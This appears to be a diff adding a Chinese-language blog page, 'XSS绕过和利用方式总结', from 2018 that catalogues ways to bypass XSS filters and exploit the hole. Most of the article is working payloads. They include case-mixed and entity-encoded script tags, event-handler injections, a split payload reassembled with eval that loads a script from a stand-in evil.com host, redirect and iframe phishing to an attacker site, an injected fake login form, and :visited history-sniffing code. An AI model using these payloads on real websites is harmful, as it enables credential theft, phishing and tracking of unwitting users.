@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  
+  <title>
+    XSS绕过和利用方式总结 | Leticia‘s Blog 
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+  <meta name="author" content="麻薯">
+
+
+
+  <meta name="keywords" content=",XSS,漏洞利用">
+<meta name="description" content="0x00 XSSXSS，跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。比如获取用户Cookie，会话劫持，钓鱼欺骗等多种攻击。
+0x01 绕过实际的情况中，很多网站会对&amp;lt;&amp;gt;，script等关键词进行限制，也有的不允许在input中运">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS绕过和利用方式总结 | Leticia‘s Blog">
+<meta property="og:url" content="http://yoursite.com/2018/04/24/XSS绕过和利用方式总结/index.html">
+<meta property="og:site_name" content="Leticia‘s Blog">
+<meta property="og:description" content="0x00 XSSXSS，跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。比如获取用户Cookie，会话劫持，钓鱼欺骗等多种攻击。
+0x01 绕过实际的情况中，很多网站会对&amp;lt;&amp;gt;，script等关键词进行限制，也有的不允许在input中运">
+<meta property="og:updated_time" content="2018-04-24T14:05:44.787Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS绕过和利用方式总结 | Leticia‘s Blog">
+<meta name="twitter:description" content="0x00 XSSXSS，跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。比如获取用户Cookie，会话劫持，钓鱼欺骗等多种攻击。
+0x01 绕过实际的情况中，很多网站会对&amp;lt;&amp;gt;，script等关键词进行限制，也有的不允许在input中运">
+
+  <!-- favicon icon files -->
+
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+  <link rel="icon" href="/images/favicon.ico">
+
+  <!-- css files -->
+  <link rel="stylesheet" href="/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/css/uno.css">
+  <link rel="stylesheet" href="/css/tagscloud.css">
+  <link rel="stylesheet" href="/css/links.css">
+  <link rel="stylesheet" href="/css/archive.css">
+  <link rel="stylesheet" href="/css/jquery.fancybox.css">
+  <link href="//cdn.bootcss.com/highlight.js/9.8.0/styles/monokai-sublime.min.css" rel="stylesheet">
+  <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<body>
+  <!-- mobile menu -->
+  <span class="mobile btn-mobile-menu">
+    <i class="fa btn-mobile-menu__icon fa-bars" aria-hidden="true"></i>
+  </span>
+  <!-- side panel -->
+  
+  <header class="panel-cover panel-cover--collapsed">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+      
+        <a href="/" title="link to homepage for Leticia‘s Blog"><img src="/images/avatar.jpg" width="80" alt="Leticia‘s Blog logo" class="panel-cover__logo logo" /></a>
+      
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">麻薯</a></h1>
+        <hr class="panel-cover__divider" />
+        
+        <p class="panel-cover__description">
+          She will never see the day it blossoms,maybe.
+        </p>
+        <hr class="panel-cover__divider" />
+        
+        <!-- TagsCloud -->
+        
+
+  <div id="tagscloud">
+<a href="/tags/漏洞利用/" class="tagc1">漏洞利用 : 15</a><a href="/tags/python/" class="tagc2">python : 7</a><a href="/tags/网络安全/" class="tagc3">网络安全 : 5</a><a href="/tags/sql注入/" class="tagc4">sql注入 : 4</a><a href="/tags/mysql/" class="tagc5">mysql : 4</a><a href="/tags/ctf/" class="tagc1">ctf : 3</a><a href="/tags/暴力破解/" class="tagc2">暴力破解 : 3</a><a href="/tags/php/" class="tagc3">php : 3</a><a href="/tags/笔记/" class="tagc4">笔记 : 2</a><a href="/tags/密码学/" class="tagc5">密码学 : 2</a><a href="/tags/文件上传/" class="tagc1">文件上传 : 2</a><a href="/tags/硬件安全/" class="tagc2">硬件安全 : 2</a><a href="/tags/heartbleed/" class="tagc3">heartbleed : 1</a><a href="/tags/BurpSuite/" class="tagc4">BurpSuite : 1</a><a href="/tags/XSS/" class="tagc5">XSS : 1</a><a href="/tags/SSRF/" class="tagc1">SSRF : 1</a><a href="/tags/CSRF/" class="tagc2">CSRF : 1</a><a href="/tags/arp入侵/" class="tagc3">arp入侵 : 1</a><a href="/tags/nmap/" class="tagc4">nmap : 1</a><a href="/tags/redis/" class="tagc5">redis : 1</a>
+</div>
+
+        <div class="navigation-wrapper">
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+            
+              
+              <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客</a></li>
+            
+              
+              <li class="navigation__item"><a href="/archive/" title="" class="">归档</a></li>
+            
+              
+              <li class="navigation__item"><a href="/links/" title="" class="">友链</a></li>
+            
+            </ul>
+          </nav>
+          
+<hr class="panel-cover__divider">
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/echohun" title="麻薯's GitHub">
+          <i class='fa fa-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+        </div>
+      </div>
+    </div>
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+  <div class="content-wrapper">
+    <div class="content-wrapper__inner entry">
+      <!-- body panel -->
+      
+<article class="post-container post-container--single">
+  <header class="post-header">
+    <h1 class="post-title">XSS绕过和利用方式总结</h1>
+    
+    <div class="post-meta">
+      <time datetime="2018-04-24 22:02:17" class="post-meta__date date">2018-04-24 22:02:17</time> 
+      <span class="post-meta__tags tags">
+      
+        <font class="categories">&#8226; 分类:
+        <a class="categories-link" href="/categories/漏洞利用/">漏洞利用</a>
+        </font>
+      
+      
+        &#8226; 标签:
+        <font class="tags">
+        <a class="tags-link" href="/tags/XSS/">XSS</a>, <a class="tags-link" href="/tags/漏洞利用/">漏洞利用</a>
+        </font>
+      
+      </span>
+    </div>
+    
+  </header>
+  <section id="post-content" class="article-content post">
+  <h2 id="0x00-XSS"><a href="#0x00-XSS" class="headerlink" title="0x00 XSS"></a>0x00 XSS</h2><p>XSS，跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。比如获取用户Cookie，会话劫持，钓鱼欺骗等多种攻击。</p>
+<h2 id="0x01-绕过"><a href="#0x01-绕过" class="headerlink" title="0x01 绕过"></a>0x01 绕过</h2><p>实际的情况中，很多网站会对&lt;&gt;，script等关键词进行限制，也有的不允许在input中运行js脚本，这个时候，就需要去考虑怎么绕过。</p>
+<ul>
+<li>1 大小写混用</li>
+</ul>
+<p>首先是最简单的大小写混用，对一些仅仅匹配过滤的系统进行绕过，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;ScRipt&gt;AleRt(&apos;xss&apos;)&lt;/ScRipt&gt;</div></pre></td></tr></table></figure></p>
+<ul>
+<li>2 利用HTML标签属性值执行</li>
+</ul>
+<p>在某些系统中，用户不能自己构造html标签，这个时候可以使用html标签属性值调用js，比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;table background=&quot;jacascript:alert(/xss/)&quot;&gt;&lt;/table&gt;</div><div class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;);&quot;&gt;</div></pre></td></tr></table></figure></p>
+<ul>
+<li>3 回车空格等</li>
+</ul>
+<p>在有些系统中，xss Filter仅仅将敏感字符列入黑名单，可以通过空格，tab，回车来绕过限制，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;javas cript:alert(&apos;xss&apos;);&quot;&gt;</div></pre></td></tr></table></figure></p>
+<p>或者换行输入用分号分隔：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;javas</div><div class="line">cript:</div><div class="line">alert(&apos;xss&apos;);&quot;&gt;</div></pre></td></tr></table></figure></p>
+<ul>
+<li>4 对标签属性进行转码</li>
+</ul>
+<p>普通的标签属性值过滤还可以通过编码绕过，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;);&quot;&gt;</div></pre></td></tr></table></figure></p>
+<p>可以写成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&gt;</div></pre></td></tr></table></figure></p>
+<ul>
+<li>5 自己构造事件</li>
+</ul>
+<p>不能依靠属性值运行xss的时候，我们可以尝试通过html事件来实现xss，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;#&quot; onerror=alert(&apos;xss&apos;) &gt;</div></pre></td></tr></table></figure></p>
+<p>图片地址不存在，加载失败的时候就会运行后面的脚本</p>
+<p>也可以在别的位置使用：<br>onload加载完成时运行<br>oncheck点击时运行<br>onmousemove当鼠标移动时运行</p>
+<ul>
+<li>6 注释过滤</li>
+</ul>
+<p>在样式表中，/**/中间的内容会被浏览器忽略，在css中，我们可以使用expression执行js代码，这个时候遇到黑名单过滤，我们就可以通过添加无意义的注释符号来避开过滤。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;div style=&quot;xss:expr/*xss*/ession(alert(&apos;xss&apos;))&quot;&gt;</div></pre></td></tr></table></figure>
+<ul>
+<li>7 拆分跨站</li>
+</ul>
+<p>有的网站输入框对输入长度有所限制，无法构造出完整的xss代码，这个时候有一种十分巧妙的拆分法可供选择，如我们要输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.write(&apos;&lt;script src=http://www.evil.com/hack.js&gt;&lt;/script&gt;&apos;)</div></pre></td></tr></table></figure></p>
+<p>但是输入框限制每次只能输入30个字符时，我们可以：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+&apos;&lt;script&apos;&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+&apos;src=htt&apos;&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+&apos;p://www&apos;&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+&apos;.evil.c&apos;&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+&apos;om/hack&apos;&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+&apos;.js&gt;&lt;/s&apos;&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+&apos;cript&gt;&quot;&apos;&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+&apos;)&apos;&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+&apos;eval(z)&apos;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>这样就成功将代码拼接在z中，再通过eval(z)执行代码。</p>
+<h2 id="0x03-cookie劫持"><a href="#0x03-cookie劫持" class="headerlink" title="0x03 cookie劫持"></a>0x03 cookie劫持</h2><p>cookie劫持在上一篇的跨站脚本攻击中已经详细演示过，具体方法就是通过用户点击链接访问页面，执行恶意xss代码然后将用户的浏览器cookie发送到我们自己的远程服务器，然后通过cookie来登陆。</p>
+<h2 id="0x04-xss钓鱼"><a href="#0x04-xss钓鱼" class="headerlink" title="0x04 xss钓鱼"></a>0x04 xss钓鱼</h2><p>xss钓鱼是xss最常用的利用方式，有很多种实现方式：</p>
+<ul>
+<li>xss重定向钓鱼</li>
+</ul>
+<p>我们在一个网页找到了xss漏洞：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.123.com/index.php?input=[Expliot]</div></pre></td></tr></table></figure></p>
+<p>构造如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.123.com/index.php?input=&lt;script&gt;document.location.href=&quot;http://www.hack.com&quot;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>就可以通过xss重定向，将网页跳转到www.hack.com</p>
+<ul>
+<li>HTML注入式钓鱼</li>
+</ul>
+<p>仍然假设有如下漏洞页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.123.com/index.php?input=[Expliot]</div></pre></td></tr></table></figure></p>
+<p>然后我们在input里面写入一段html代码，就会在正常的网页中增添一个我们构造的登陆表单：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://www.hack.com/index.php?input=&quot;&apos;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;</div><div class="line">&lt;body&gt;&lt;div style=&quot;text-align: center;&quot;&gt;&lt;form</div><div class="line">Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br/&gt;Login:&lt;br/&gt;</div><div class="line">&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p>然后通过这个表单覆盖网页中的部分位置，就很容易引诱用户输入账号密码。</p>
+<ul>
+<li>iframe钓鱼</li>
+</ul>
+<p>iframe是HTML标签，作用是文档中的文档，或者浮动的框架(FRAME)。iframe元素会创建包含另外一个文档的内联框架。<br>我们先来看一个iframe的例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;style&gt;body&#123;</div><div class="line">      margin:0px;</div><div class="line">	  border:0px;</div><div class="line">	  padding:0px;</div><div class="line">  &#125;</div><div class="line">iframe&#123;border:0px;</div><div class="line">&#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;iframe src=&quot;http://www.baidu.com/&quot; id=&quot;iframepage&quot; name=&quot;iframepage&quot;  width=&quot;100%&quot; height=&quot;100%&quot; &gt;&lt;/iframe&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>这样我们可以用百度页面覆盖整个网页。</p>
+<p>而xss-iframe钓鱼就是攻击者在有xss的网站中用iframe框架调用自己的黑页，覆盖整个页面或者登陆框，将数据传给自己。<br>我们可以先在自己的www.hack.com搭建好完全和对方相同的网页，并且在后台写好接收保存账号密码的php文件，然后将style和iframe写在xss中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;body&#123;margin:0px;border:0px;padding:0px;&#125;</div><div class="line">iframe&#123;border:0px;&#125;</div><div class="line">&lt;iframe src=&quot;http://www.hack.com/&quot;width=&quot;100%&quot; height=&quot;100%&quot;&gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure></p>
+<p>就会覆盖整个网页，并且将数据传给我们的网站。而且用户访问这个网站时url仍然是原本的url。</p>
+<h2 id="0x05-http-history-hack"><a href="#0x05-http-history-hack" class="headerlink" title="0x05 http history hack"></a>0x05 http history hack</h2><p>css中有个属性visited，可以设置访问过的链接样式，然后xss可以通过遍历检查css中的visited属性，来查看一个用户是否访问过某些网站。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt; script &gt;</div><div class="line">var websites = [要检测的访问过的网址列表（自己补充）];</div><div class="line">//遍历每个URL</div><div class="line">for (var i = 0; i &lt; websites.length: i++) &#123;</div><div class="line">    var link = document.createElement(&quot;a&quot;);</div><div class="line">    link.id = &quot;id&quot; + i;</div><div class="line">    link.href = websites[i];</div><div class="line">    link.innerHTML = websites[i];</div><div class="line">    document.write(&apos;&lt;style&gt;&apos;);</div><div class="line">    document.write(&apos;#id&apos; + i + &quot;:visited &#123;color:#FF0000;&#125;&quot;);</div><div class="line">    document.write(&apos;&lt;/style&gt;&apos;);</div><div class="line">    document.body.appendChild(link);</div><div class="line">    var color = document.defaultView.getComputedStyle(link, null).getPropertyValue(&quot;color&quot;);</div><div class="line">    document.body.removeChild(link);</div><div class="line">    if (color == &quot;rgb(255,0,0)&quot;) &#123; //visited</div><div class="line">        var item = document.createElement(&apos;li&apos;);</div><div class="line">        item.appendChild(link);</div><div class="line">        document.getElementById(&apos;visited&apos;).appendChild(item);</div><div class="line">    &#125; else &#123; //Not visited</div><div class="line">        var item = document.createElement(&apos;li&apos;);</div><div class="line">        item.appendChild(link);</div><div class="line">        document.getElementById(&apos;notvisited&apos;).appendChild(item);</div><div class="line">    &#125;</div><div class="line">&#125; &lt; /script&gt;/</div></pre></td></tr></table></figure></p>
+<h2 id="0x06-xss网页挂马"><a href="#0x06-xss网页挂马" class="headerlink" title="0x06 xss网页挂马"></a>0x06 xss网页挂马</h2><p>在存储型xss中，我们可以将自己的xss代码提交上去，然后链接我们的木马，这样每个访问有xss页面的人都会触发木马。</p>
+<h2 id="0x07-xss-Wrom"><a href="#0x07-xss-Wrom" class="headerlink" title="0x07 xss Wrom"></a>0x07 xss Wrom</h2><p>xss wrom即xss蠕虫，在一些存在存储型xss漏洞的大型社交网站，如果我们将xss代码的功能写成让访问到的人，在自己的主页里或其他有权限的页面提交一个一样的xss代码，这样浏览他的主页的人也会受到xss wrom影响继续写xss代码，这样就会很快传遍整个网络，危害极大。<br>而且xss蠕虫通常使用了大量的Ajax技术，即异步请求，无须刷新即可传输数据，隐蔽性高，传播速度极快。</p>
+
+  </section>
+  <div class="copyright">
+    <span>文本标题:</span><a href="/2018/04/24/XSS绕过和利用方式总结/" target="_blank">XSS绕过和利用方式总结</a><br />
+    <span>文章作者:</span><a href="/" title="回到主页" target="_blank">麻薯</a><br />
+    <span>发布时间:</span>2018-04-24 22:02:17<br />
+    <span>最后更新:</span>2018-04-24 22:05:44<br />
+    <span>原始链接:</span><a href="http://www.uuzdaisuki.com">www.uuzdaisuki.com</a><br />
+    <span>转载声明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
+  </div>
+</article>
+      <!-- footer panel -->
+      <footer class="footer">
+	<center>
+    <span class="footer__copyright">&copy; 2016-2017. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/virink/vhuno">vHuno</a></span>
+    <span>本站采用<i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+    </center>
+</footer>
+    </div>
+  </div>
+  <!-- js files -->
+  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/js/main.js"></script>
+  <script src="/js/scale.fix.js"></script>
+  <script src="/js/tagcloud.js"></script>
+  
+  
+	<script src="/js/jquery.fancybox.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			$(".fancybox").fancybox({
+	            padding: 0,
+	            helpers: {
+	                overlay: {
+	                  locked: false
+	                }
+	            }
+	        });
+		});
+	</script>
+
+  
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+  <script src="//cdn.bootcss.com/highlight.js/9.8.0/highlight.min.js"></script>
+  <script src="/js/gallery.js"></script>
+  <script>
+  $(document).ready(function(){
+    hljs.initHighlightingOnLoad();
+  });
+  </script>
+  
+  
+<div id="totop" style="position: fixed; bottom: 50px; right: 30px; cursor: pointer; opacity: 1;">
+	<a title="back to top"><img style="width:30px;height:30px;" src="/images/totop.png"></a>
+</div>
+<script>
+    (function($) {
+        var upperLimit = 100;
+        var scrollElem = $('#totop');
+        var scrollSpeed = 500;
+        scrollElem.hide();
+        $(window).scroll(function() {
+            var scrollTop = $(document).scrollTop();
+            if (scrollTop > upperLimit) {
+                $(scrollElem).stop().fadeTo(300, 1); // fade back in
+            } else {
+                $(scrollElem).stop().fadeTo(300, 0); // fade out
+            }
+        });
+        $(scrollElem).click(function() {
+            $('html, body').animate({
+                scrollTop: 0
+            }, scrollSpeed);
+            return false;
+        });
+    })(jQuery);
+    </script>
+
+
+  <!-- Analytics Google -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-83885261-1', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+
+  <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+</body>
+</html>
